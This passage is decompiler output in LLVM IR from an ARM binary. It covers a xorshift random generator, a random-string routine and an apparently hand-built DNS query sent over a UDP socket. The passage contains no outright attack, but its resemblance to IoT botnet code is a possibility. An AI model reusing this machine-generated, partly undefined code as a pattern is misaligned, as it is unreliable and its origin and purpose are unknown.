  store i32 %v2_8eac, i32* @lr, align 4
  %v2_92b4 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_92b4, i32* %r0.global-to-local, align 4
  %v6_92b8 = inttoptr i32 %v5_92ac to i8*
  store i8* %v6_92b8, i8** %stack_var_-42, align 4
  store i32 %v5_92ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8f18, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_92c8

dec_label_pc_92c8:                                ; preds = %.thread4, %dec_label_pc_9288
  %storemerge = phi i32 [ 16384, %dec_label_pc_9288 ], [ %v2_922c, %.thread4 ]
  %v2_92c8 = phi i32 [ %v5_92ac, %dec_label_pc_9288 ], [ 2, %.thread4 ]
  %v1_92c8 = phi i32 [ %v2_8f18, %dec_label_pc_9288 ], [ %v2_8f20, %.thread4 ]
  %v0_92c8 = phi i32 [ %v2_92b4, %dec_label_pc_9288 ], [ %v3_9220, %.thread4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v4_92c8 = call i32 @function_c354(i32 %v0_92c8, i32 %v1_92c8, i32 %v2_92c8, i32 %storemerge)
  store i32 %v4_92c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f24

dec_label_pc_92d0:                                ; preds = %dec_label_pc_8e44
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v7_9260, { 1, 0, 2, 3 }
  uselistorder i32 %v5_923c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_9218, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9204, { 1, 0 }
  uselistorder i32 %v4_9200, { 1, 0, 2 }
  uselistorder i32 %v1_91cc, { 1, 0 }
  uselistorder i1 %v7_91b4, { 1, 0 }
  uselistorder i32 %v1_90dc, { 1, 0 }
  uselistorder i32 %v2_91b0, { 2, 1, 0, 6, 4, 3, 5 }
  uselistorder i1 %v7_9078, { 1, 0 }
  uselistorder i32 %v5_9074, { 1, 2, 0, 3 }
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v3_9020, { 1, 0 }
  uselistorder i32 %v1_9004, { 1, 0 }
  uselistorder i32 %v3_8ff8, { 1, 0 }
  uselistorder i32 %v0_902c, { 1, 0, 3, 2, 4 }
  uselistorder i1 %v7_8f80, { 1, 0 }
  uselistorder i32 %v3_8f7c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8f64, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8f58, { 1, 2, 0 }
  uselistorder i32 %v2_901c, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_8f4c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8f20, { 0, 4, 3, 5, 6, 2, 1, 7 }
  uselistorder i32 %v2_8f18, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8eb8, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i32 %v2_8eac, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i8** %stack_var_-42, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 0, 31, 32, 30, 29, 1, 33, 34 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 19, 18, 20, 21, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 6, 5, 7, 10, 8, 9, 61, 11, 13, 12, 15, 14, 16, 18, 17, 19, 58, 21, 20, 22, 62, 23, 3, 24, 25, 26, 28, 27, 29, 31, 30, 60, 32, 33, 2, 34, 35, 36, 37, 38, 1, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 50, 49, 51, 53, 52, 54, 59, 55, 0, 56, 57 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 21, 22 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i8* bitcast (i8** @global_var_1d4b8.106 to i8*), { 1, 0 }
  uselistorder i32 1164, { 2, 0, 1 }
  uselistorder i8** @global_var_1d4b8.106, { 1, 0 }
  uselistorder i32* @global_var_1d32c.104, { 1, 2, 3, 4, 6, 7, 8, 9, 5, 10, 0, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_13ffc.99 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_8c44, { 1, 0 }
  uselistorder i32 (i32)* @function_af48, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_13d2c.88 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_92c8, { 1, 0 }
  uselistorder label %dec_label_pc_9130, { 1, 0 }
  uselistorder label %dec_label_pc_912c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_90bc, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_8fe4, { 1, 0 }
  uselistorder label %dec_label_pc_8f54.dec_label_pc_8f54_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c.dec_label_pc_8f2c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8f24, { 7, 1, 0, 2, 3, 8, 4, 9, 5, 6, 10 }
  uselistorder label %dec_label_pc_8e44, { 1, 0 }
}

define i32 @function_9310() local_unnamed_addr {
dec_label_pc_9310:
  %v2_931c = load i32, i32* @global_var_1d4bc.114, align 4
  %v2_9320 = load i32, i32* @global_var_1d4c8.116, align 4
  %v4_932c = mul i32 %v2_931c, 2048
  %v5_932c = xor i32 %v4_932c, %v2_931c
  %v4_9330 = udiv i32 %v2_9320, 524288
  %v5_9330 = xor i32 %v4_9330, %v2_9320
  %v2_9334 = load i32, i32* @global_var_1d4c0.118, align 4
  %v2_9338 = load i32, i32* @global_var_1d4c4.120, align 4
  %v2_933c = xor i32 %v5_9330, %v5_932c
  %v4_9340 = udiv i32 %v5_932c, 256
  %v5_9340 = xor i32 %v2_933c, %v4_9340
  store i32 %v2_9334, i32* @global_var_1d4bc.114, align 4
  store i32 %v2_9338, i32* @global_var_1d4c0.118, align 4
  store i32 %v2_9320, i32* @global_var_1d4c4.120, align 4
  store i32 %v5_9340, i32* @global_var_1d4c8.116, align 4
  ret i32 %v5_9340

; uselistorder directives
  uselistorder i32 %v2_9320, { 2, 1, 0 }
  uselistorder i32 %v2_931c, { 1, 0 }
}

define i32 @function_936c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_936c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_936c = load i32, i32* @r4, align 4
  %v6_936c = load i32, i32* @r5, align 4
  %v9_936c = load i32, i32* @r6, align 4
  %v12_936c = load i32, i32* @r7, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_1d330.122 to i32), i32* @r7, align 4
  %v0_937c = load i32, i32* %r0.global-to-local, align 4
  %v1_93a81 = add i32 %arg2, -1
  store i32 %v1_93a81, i32* @r6, align 4
  %v3_93ac2 = icmp eq i32 %arg2, 0
  %v1_93b08 = add i32 %v0_937c, 1
  store i32 %v1_93b08, i32* @r5, align 4
  br i1 %v3_93ac2, label %dec_label_pc_93b8, label %dec_label_pc_9384

dec_label_pc_9384:                                ; preds = %dec_label_pc_936c, %dec_label_pc_9384
  %v0_9384 = call i32 @function_9310()
  store i32 %v0_9384, i32* @r4, align 4
  %v0_938c = load i32, i32* @r7, align 4
  store i32 %v0_938c, i32* @r0, align 4
  %v0_9390 = call i32 @function_aab8()
  %v0_9398 = load i32, i32* @r4, align 4
  store i32 %v0_9398, i32* %r0.global-to-local, align 4
  %v2_939c = call i32 @function_b5a4(i32 %v0_9398, i32 %v0_9390)
  store i32 %v2_939c, i32* %r0.global-to-local, align 4
  %v0_93a0 = load i32, i32* @r7, align 4
  %v2_93a0 = add i32 %v0_93a0, %v0_9390
  %v3_93a0 = inttoptr i32 %v2_93a0 to i8*
  %v4_93a0 = load i8, i8* %v3_93a0, align 1
  %v2_93a4 = load i32, i32* @r5, align 4
  %v3_93a4 = add i32 %v2_93a4, -1
  %v4_93a4 = inttoptr i32 %v3_93a4 to i8*
  store i8 %v4_93a0, i8* %v4_93a4, align 1
  %v0_93a8.pr = load i32, i32* @r6, align 4
  %v1_93a8 = add i32 %v0_93a8.pr, -1
  store i32 %v1_93a8, i32* @r6, align 4
  %v3_93ac = icmp eq i32 %v0_93a8.pr, 0
  %v0_93b0 = load i32, i32* @r5, align 4
  %v1_93b0 = add i32 %v0_93b0, 1
  store i32 %v1_93b0, i32* @r5, align 4
  br i1 %v3_93ac, label %dec_label_pc_93a8.dec_label_pc_93b8_crit_edge, label %dec_label_pc_9384

dec_label_pc_93a8.dec_label_pc_93b8_crit_edge:    ; preds = %dec_label_pc_9384
  %v1_93c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_93b8

dec_label_pc_93b8:                                ; preds = %dec_label_pc_93a8.dec_label_pc_93b8_crit_edge, %dec_label_pc_936c
  %v1_93c0 = phi i32 [ %v1_93c0.pre, %dec_label_pc_93a8.dec_label_pc_93b8_crit_edge ], [ %v0_937c, %dec_label_pc_936c ]
  store i32 %v3_936c, i32* @r4, align 4
  store i32 %v6_936c, i32* @r5, align 4
  store i32 %v9_936c, i32* @r6, align 4
  store i32 %v12_936c, i32* @r7, align 4
  ret i32 %v1_93c0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9384, { 1, 0 }
}

define i32 @function_93c8() local_unnamed_addr {
dec_label_pc_93c8:
  %v2_93d4 = call i32 @function_bad0(i32* null)
  store i32 %v2_93d4, i32* @global_var_1d4bc.114, align 4
  %v1_93e0 = call i32 @function_e494(i32 %v2_93d4)
  store i32 %v1_93e0, i32* @r0, align 4
  %v0_93e8 = call i32 @function_b904()
  %v2_93f0 = xor i32 %v1_93e0, %v0_93e8
  store i32 %v2_93f0, i32* @global_var_1d4c0.118, align 4
  %v1_93f8 = call i32 @function_bf9c(i32 %v2_93f0)
  %v2_93fc = load i32, i32* @global_var_1d4c0.118, align 4
  %v2_9404 = xor i32 %v2_93fc, %v1_93f8
  store i32 %v2_9404, i32* @global_var_1d4c8.116, align 4
  store i32 %v1_93f8, i32* @global_var_1d4c4.120, align 4
  ret i32 %v1_93f8

; uselistorder directives
  uselistorder i32 %v1_93f8, { 1, 2, 0 }
  uselistorder i32* @global_var_1d4c4.120, { 1, 0, 2 }
  uselistorder i32* @global_var_1d4c8.116, { 1, 0, 2 }
  uselistorder i32* @global_var_1d4c0.118, { 2, 1, 0, 3 }
  uselistorder i32* @global_var_1d4bc.114, { 1, 0, 2 }
}

define i32 @function_9430(i32 %arg1) local_unnamed_addr {
dec_label_pc_9430:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i16 @__decompiler_undefined_function_2()
  %stack_var_-4289 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4276 = alloca i32, align 4
  %stack_var_-4288 = alloca i16, align 2
  %stack_var_-2228 = alloca i32, align 4
  %stack_var_-2240 = alloca i16, align 2
  %v3_9430 = load i32, i32* @r4, align 4
  %v6_9430 = load i32, i32* @r5, align 4
  %v9_9430 = load i32, i32* @r6, align 4
  %v12_9430 = load i32, i32* @r7, align 4
  %v15_9430 = load i32, i32* @r8, align 4
  %v18_9430 = load i32, i32* @sb, align 4
  %v21_9430 = load i32, i32* @sl, align 4
  %v24_9430 = load i32, i32* @fp, align 4
  %v27_9430 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v0_9440 = call i32 @function_aab8()
  store i32 %v0_9440, i32* %r0.global-to-local, align 4
  store i32 %v0_9440, i32* @r5, align 4
  %v0_9448 = call i32 @function_af0c()
  %v2_9454 = ptrtoint i16* %stack_var_-2240 to i32
  store i32 %v2_9454, i32* @r6, align 4
  %v2_9458 = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_9458, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 %v2_9458, i32* %r0.global-to-local, align 4
  %v1_94b821 = load i32, i32* @r5, align 4
  %v3_94b823 = icmp eq i32 %v1_94b821, 0
  store i1 %v3_94b823, i1* %cpsr_z.global-to-local, align 1
  %v5_94bc30 = icmp sgt i32 %v1_94b821, 0
  br i1 %v5_94bc30, label %dec_label_pc_9470, label %dec_label_pc_94c0

dec_label_pc_9470:                                ; preds = %dec_label_pc_9430, %dec_label_pc_94b4
  %v1_94b842 = phi i32 [ %v1_94b8, %dec_label_pc_94b4 ], [ %v1_94b821, %dec_label_pc_9430 ]
  %v2_9480 = phi i32 [ %v2_948037, %dec_label_pc_94b4 ], [ %v2_9458, %dec_label_pc_9430 ]
  %v0_947c = phi i32 [ %v0_947c35, %dec_label_pc_94b4 ], [ 0, %dec_label_pc_9430 ]
  %v1_947c = phi i32 [ %v1_94b4, %dec_label_pc_94b4 ], [ 0, %dec_label_pc_9430 ]
  %v1_9470 = load i32, i32* %r4.global-to-local, align 4
  %v2_9470 = add i32 %v1_9470, %v1_947c
  %v3_9470 = inttoptr i32 %v2_9470 to i8*
  %v4_9470 = load i8, i8* %v3_9470, align 1
  %v6_9470 = zext i8 %v4_9470 to i32
  store i32 %v6_9470, i32* %r3.global-to-local, align 4
  %v7_9474 = icmp eq i8 %v4_9470, 46
  store i1 %v7_9474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9474, label %dec_label_pc_947c, label %dec_label_pc_94b4

dec_label_pc_947c:                                ; preds = %dec_label_pc_9470
  %v2_947c = sub i32 %v1_947c, %v0_947c
  store i32 %v2_947c, i32* %r3.global-to-local, align 4
  %v1_9480 = trunc i32 %v2_947c to i8
  %v3_9480 = inttoptr i32 %v2_9480 to i8*
  store i8 %v1_9480, i8* %v3_9480, align 1
  %v4_9480 = load i32, i32* %r0.global-to-local, align 4
  %v5_9480 = add i32 %v4_9480, 1
  store i32 %v5_9480, i32* %r0.global-to-local, align 4
  %v0_9484 = load i32, i32* %r4.global-to-local, align 4
  %v1_9484 = load i32, i32* @lr, align 4
  %v2_9484 = add i32 %v1_9484, %v0_9484
  store i32 %v2_9484, i32* %r1.global-to-local, align 4
  store i32 %v5_9480, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9498

dec_label_pc_9490:                                ; preds = %dec_label_pc_9498
  %v2_9490 = inttoptr i32 %v0_94a4 to i8*
  %v3_9490 = load i8, i8* %v2_9490, align 1
  %v4_9490 = zext i8 %v3_9490 to i32
  store i32 %v4_9490, i32* %r3.global-to-local, align 4
  %v4_9494 = inttoptr i32 %v0_94a0 to i8*
  store i8 %v3_9490, i8* %v4_9494, align 1
  %v0_9498.pre = load i32, i32* @lr, align 4
  %v0_94a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_94a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9498

dec_label_pc_9498:                                ; preds = %dec_label_pc_947c, %dec_label_pc_9490
  %v0_94a4 = phi i32 [ %v2_9484, %dec_label_pc_947c ], [ %v0_94a4.pre, %dec_label_pc_9490 ]
  %v0_94a0 = phi i32 [ %v5_9480, %dec_label_pc_947c ], [ %v0_94a0.pre, %dec_label_pc_9490 ]
  %v0_949c = phi i32 [ %v1_9484, %dec_label_pc_947c ], [ %v0_9498.pre, %dec_label_pc_9490 ]
  %v1_9498 = load i32, i32* %ip.global-to-local, align 4
  %v9_9498 = icmp eq i32 %v0_949c, %v1_9498
  store i1 %v9_9498, i1* %cpsr_z.global-to-local, align 1
  %v1_949c = add i32 %v0_949c, 1
  store i32 %v1_949c, i32* %r3.global-to-local, align 4
  store i32 %v0_94a0, i32* %r0.global-to-local, align 4
  %v1_94a4 = add i32 %v0_94a4, 1
  store i32 %v1_94a4, i32* %r1.global-to-local, align 4
  store i32 %v1_949c, i32* @lr, align 4
  %v1_94ac = add i32 %v0_94a0, 1
  store i32 %v1_94ac, i32* %r2.global-to-local, align 4
  %v5_94b0 = icmp slt i32 %v0_949c, %v1_9498
  br i1 %v5_94b0, label %dec_label_pc_9490, label %dec_label_pc_94b4.loopexit

dec_label_pc_94b4.loopexit:                       ; preds = %dec_label_pc_9498
  %v1_94b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_94b4

dec_label_pc_94b4:                                ; preds = %dec_label_pc_94b4.loopexit, %dec_label_pc_9470
  %v1_94b8 = phi i32 [ %v1_94b8.pre, %dec_label_pc_94b4.loopexit ], [ %v1_94b842, %dec_label_pc_9470 ]
  %v0_94b4 = phi i32 [ %v1_9498, %dec_label_pc_94b4.loopexit ], [ %v1_947c, %dec_label_pc_9470 ]
  %v2_948037 = phi i32 [ %v0_94a0, %dec_label_pc_94b4.loopexit ], [ %v2_9480, %dec_label_pc_9470 ]
  %v0_947c35 = phi i32 [ %v1_949c, %dec_label_pc_94b4.loopexit ], [ %v0_947c, %dec_label_pc_9470 ]
  %v1_94b4 = add i32 %v0_94b4, 1
  store i32 %v1_94b4, i32* %ip.global-to-local, align 4
  %v9_94b8 = icmp eq i32 %v1_94b4, %v1_94b8
  store i1 %v9_94b8, i1* %cpsr_z.global-to-local, align 1
  %v5_94bc = icmp slt i32 %v1_94b4, %v1_94b8
  br i1 %v5_94bc, label %dec_label_pc_9470, label %dec_label_pc_94b8.dec_label_pc_94c0_crit_edge

dec_label_pc_94b8.dec_label_pc_94c0_crit_edge:    ; preds = %dec_label_pc_94b4
  %v2_94c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_94c0

dec_label_pc_94c0:                                ; preds = %dec_label_pc_94b8.dec_label_pc_94c0_crit_edge, %dec_label_pc_9430
  %v3_94c4 = phi i32 [ %v1_94b8, %dec_label_pc_94b8.dec_label_pc_94c0_crit_edge ], [ %v1_94b821, %dec_label_pc_9430 ]
  %v2_94c4 = phi i32 [ %v2_94c4.pre, %dec_label_pc_94b8.dec_label_pc_94c0_crit_edge ], [ %v2_9458, %dec_label_pc_9430 ]
  store i32 0, i32* @r4, align 4
  %v4_94c4 = add i32 %v2_94c4, %v3_94c4
  %v5_94c4 = inttoptr i32 %v4_94c4 to i8*
  store i8 0, i8* %v5_94c4, align 1
  %v0_94c8 = call i32 @function_9310()
  store i32 %v0_94c8, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r1.global-to-local, align 4
  %v2_94d0 = call i32 @function_b5a4(i32 %v0_94c8, i32 65535)
  store i32 65535, i32* %r1.global-to-local, align 4
  store i32 %v2_9458, i32* @r0, align 4
  %v0_94e4 = call i32 @function_aab8()
  %v1_94e8 = add i32 %v0_94e4, 17
  store i32 %v2_9458, i32* @r0, align 4
  %v0_94f4 = call i32 @function_aab8()
  store i32 2054, i32* %r1.global-to-local, align 4
  %v0_94fc = load i32, i32* @r7, align 4
  %v2_94fc = add i32 %v0_94fc, %v0_94f4
  store i32 %v2_94fc, i32* @r5, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_9504 = call i32 @function_d0b4(i32 1, i32 2054)
  store i32 %v2_9504, i32* %r0.global-to-local, align 4
  %v2_9528 = ptrtoint i16* %stack_var_-4288 to i32
  store i32 %v2_9528, i32* @sb, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v0_9540 = load i32, i32* @r5, align 4
  %v1_9540 = add i32 %v0_9540, 1
  store i32 %v1_9540, i32* %r3.global-to-local, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_9504, i32* @r8, align 4
  store i32 -1, i32* @sl, align 4
  %v2_9558 = ptrtoint i32* %stack_var_-4276 to i32
  store i32 %v2_9558, i32* @fp, align 4
  store i16 -1, i16* %stack_var_-2240, align 2
  %v0_9568 = load i32, i32* @r4, align 4
  %v4_956c = inttoptr i32 %v1_9540 to i16*
  store i16 4096, i16* %v4_956c, align 2
  %v0_9570 = load i32, i32* %r2.global-to-local, align 4
  %v1_9570 = trunc i32 %v0_9570 to i16
  %v2_9570 = load i32, i32* %r3.global-to-local, align 4
  %v3_9570 = add i32 %v2_9570, 2
  %v4_9570 = inttoptr i32 %v3_9570 to i16*
  store i16 %v1_9570, i16* %v4_9570, align 2
  %v2_95a4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9634 = ptrtoint i32* %stack_var_-40 to i32
  %v2_966c = ptrtoint i32* %stack_var_-48 to i32
  %v2_9670 = ptrtoint i32* %stack_var_-192 to i32
  %v4_970c = zext i16 %tmp to i32
  %v2_9710 = icmp eq i16 %tmp, 0
  %sext = mul i32 %v0_9568, 16777216
  %v4_983c100 = sdiv i32 %sext, 16777216
  store i32 %v4_983c100, i32* %r2.global-to-local, align 4
  %v1_9840101 = add nsw i32 %v4_983c100, 1
  %v3_9848102 = urem i32 %v1_9840101, 65536
  store i32 %v3_9848102, i32* %r3.global-to-local, align 4
  %v7_984c105 = icmp eq i32 %v3_9848102, 11
  store i1 %v7_984c105, i1* %cpsr_z.global-to-local, align 1
  %v5_9850106 = trunc i32 %v1_9840101 to i8
  br i1 %v7_984c105, label %dec_label_pc_9858.loopexit, label %dec_label_pc_9578

dec_label_pc_9578:                                ; preds = %dec_label_pc_94c0, %dec_label_pc_983c.backedge
  %v5_9850107 = phi i8 [ %v5_9850, %dec_label_pc_983c.backedge ], [ %v5_9850106, %dec_label_pc_94c0 ]
  %v0_9578 = load i32, i32* @sl, align 4
  %v7_9578 = icmp eq i32 %v0_9578, -1
  store i1 %v7_9578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9578, label %bb91, label %bb

bb:                                               ; preds = %dec_label_pc_9578
  store i32 %v0_9578, i32* %r0.global-to-local, align 4
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_9578, %bb
  store i32 38276, i32* @lr, align 4
  %v1_9580 = xor i1 %v7_9578, true
  call void @__pseudo_cond_branch(i1 %v1_9580, i32 ptrtoint (i32* @global_var_e720.129 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r1, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9590 = call i32 @function_c590(i32 2, i32 2, i32 0)
  store i32 %v3_9590, i32* %r0.global-to-local, align 4
  %v7_9594 = icmp eq i32 %v3_9590, -1
  store i1 %v7_9594, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9590, i32* @sl, align 4
  br i1 %v7_9594, label %dec_label_pc_95bc, label %dec_label_pc_95a0

dec_label_pc_95a0:                                ; preds = %bb91
  store i32 %v2_95a4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_95ac = call i32 @function_c1d0(i32 %v3_9590, i32 %v2_95a4, i32 16)
  store i32 %v3_95ac, i32* %r0.global-to-local, align 4
  %v3_95b0 = icmp eq i32 %v3_95ac, -1
  %v8_95b0 = icmp eq i32 %v3_95ac, -1
  store i1 %v8_95b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_95b0, label %dec_label_pc_95bc, label %dec_label_pc_95c4

dec_label_pc_95bc:                                ; preds = %dec_label_pc_95a0, %bb91, %dec_label_pc_95c4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_95bc = call i32 @function_e5cc(i32 1)
  store i32 %v1_95bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_983c.backedge

dec_label_pc_983c.backedge:                       ; preds = %dec_label_pc_96a4, %dec_label_pc_95bc, %dec_label_pc_968c, %dec_label_pc_9694, %dec_label_pc_970c, %dec_label_pc_96e8, %dec_label_pc_9718
  %v4_983c = sext i8 %v5_9850107 to i32
  store i32 %v4_983c, i32* %r2.global-to-local, align 4
  %v1_9840 = add nsw i32 %v4_983c, 1
  %v3_9848 = urem i32 %v1_9840, 65536
  store i32 %v3_9848, i32* %r3.global-to-local, align 4
  %v7_984c = icmp eq i32 %v3_9848, 11
  store i1 %v7_984c, i1* %cpsr_z.global-to-local, align 1
  %v5_9850 = trunc i32 %v1_9840 to i8
  br i1 %v7_984c, label %dec_label_pc_9858.loopexit, label %dec_label_pc_9578

dec_label_pc_95c4:                                ; preds = %dec_label_pc_95a0
  store i32 %v1_94e8, i32* %r2.global-to-local, align 4
  %v0_95c8 = load i32, i32* @sl, align 4
  store i32 %v0_95c8, i32* %r0.global-to-local, align 4
  store i32 %v2_9454, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_95d4 = call i32 @function_c4d8(i32 %v0_95c8, i32 %v2_9454, i32 %v1_94e8, i32 16384)
  store i32 %v4_95d4, i32* %r0.global-to-local, align 4
  store i32 %v1_94e8, i32* %r2.global-to-local, align 4
  %v9_95dc = icmp eq i32 %v4_95d4, %v1_94e8
  store i1 %v9_95dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_95dc, label %dec_label_pc_95ec, label %dec_label_pc_95bc

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95c4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v0_95f4 = load i32, i32* @sl, align 4
  store i32 %v0_95f4, i32* %r0.global-to-local, align 4
  %v2_95f8 = call i32 @function_b7ac(i32 %v0_95f4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9600 = or i32 %v2_95f8, 2048
  store i32 %v1_9600, i32* @r2, align 4
  %v0_9604 = load i32, i32* @sl, align 4
  store i32 %v0_9604, i32* %r0.global-to-local, align 4
  %v2_9608 = call i32 @function_b7ac(i32 %v0_9604, i32 4)
  store i32 %v2_9608, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 4128, i32* %ip.global-to-local, align 4
  %v2_962497 = load i32, i32* @sp, align 4
  %v3_962498 = add i32 %v2_962497, 4128
  %v4_962499 = inttoptr i32 %v3_962498 to i32*
  store i32 0, i32* %v4_962499, align 4
  br label %dec_label_pc_9614.dec_label_pc_9614_crit_edge

dec_label_pc_9614.dec_label_pc_9614_crit_edge:    ; preds = %dec_label_pc_95ec, %dec_label_pc_9614.dec_label_pc_9614_crit_edge
  %v0_9614.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_9624.pre = load i32, i32* @r5, align 4
  %v1_9618 = add i32 %v0_9614.pre, 4
  store i32 %v1_9618, i32* %r3.global-to-local, align 4
  %v1_961c = add i32 %v0_9614.pre, 4128
  store i32 %v1_961c, i32* %ip.global-to-local, align 4
  %v7_9620 = icmp eq i32 %v1_9618, 128
  %v2_9624 = load i32, i32* @sp, align 4
  %v3_9624 = add i32 %v2_9624, %v1_961c
  %v4_9624 = inttoptr i32 %v3_9624 to i32*
  store i32 %v0_9624.pre, i32* %v4_9624, align 4
  br i1 %v7_9620, label %dec_label_pc_962c, label %dec_label_pc_9614.dec_label_pc_9614_crit_edge

dec_label_pc_962c:                                ; preds = %dec_label_pc_9614.dec_label_pc_9614_crit_edge
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_9630 = load i32, i32* @sl, align 4
  %v3_9630 = udiv i32 %v0_9630, 32
  store i32 %v3_9630, i32* %r3.global-to-local, align 4
  %v4_9638 = mul nuw nsw i32 %v3_9630, 4
  %v5_9638 = add i32 %v4_9638, %v2_9634
  store i32 %v5_9638, i32* @r4, align 4
  %v1_963c = add i32 %v5_9638, -152
  %v2_963c = inttoptr i32 %v1_963c to i32*
  %v3_963c = load i32, i32* %v2_963c, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_9644 = urem i32 %v0_9630, 32
  store i32 %v1_9644, i32* @r6, align 4
  %v7_9648 = shl i32 1, %v1_9644
  %v8_9648 = or i32 %v3_963c, %v7_9648
  store i32 10, i32* @lr, align 4
  store i32 %v8_9648, i32* %v2_963c, align 4
  %v0_9658 = load i32, i32* @lr, align 4
  store i32 %v0_9658, i32* %stack_var_-48, align 4
  %v0_9660 = load i32, i32* @sl, align 4
  %v1_9660 = load i32, i32* %r1.global-to-local, align 4
  %v2_9660 = add i32 %v1_9660, %v0_9660
  store i32 %v2_9660, i32* %r0.global-to-local, align 4
  store i32 %v2_966c, i32* %ip.global-to-local, align 4
  store i32 %v2_9670, i32* %r1.global-to-local, align 4
  %v0_9674 = load i32, i32* @r5, align 4
  store i32 %v0_9674, i32* %r2.global-to-local, align 4
  store i32 %v0_9674, i32* %r3.global-to-local, align 4
  %v5_9680 = call i32 @function_ba0c(i32 %v2_9660, i32 %v2_9670, i32 %v0_9674, i32 %v0_9674, i32 %v2_966c)
  store i32 %v5_9680, i32* %r0.global-to-local, align 4
  %v7_9684 = icmp eq i32 %v5_9680, -1
  store i1 %v7_9684, i1* %cpsr_z.global-to-local, align 1
